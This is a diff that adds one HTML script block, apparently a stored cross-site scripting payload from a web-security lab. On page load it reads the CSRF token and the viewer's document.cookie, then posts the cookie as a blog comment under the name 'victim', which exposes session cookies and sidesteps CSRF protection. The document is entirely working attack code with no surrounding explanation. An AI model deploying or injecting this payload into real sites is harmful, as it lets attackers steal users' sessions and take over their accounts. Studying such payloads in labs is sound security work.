@@ -1,0 +1,22 @@
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    const csrf = document.querySelector('input[name="csrf"]').value;
+    const postId = document.querySelector('input[name="postId"]').value;
+    const cookie = document.cookie;
+
+    fetch('/post/comment', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        },
+        body: new URLSearchParams({
+            csrf: csrf,
+            postId: postId,
+            comment: cookie,
+            name: 'victim',
+            email: 'victim@example.com',
+            website: 'https://example.com'
+        })
+    });
+});
+</script>
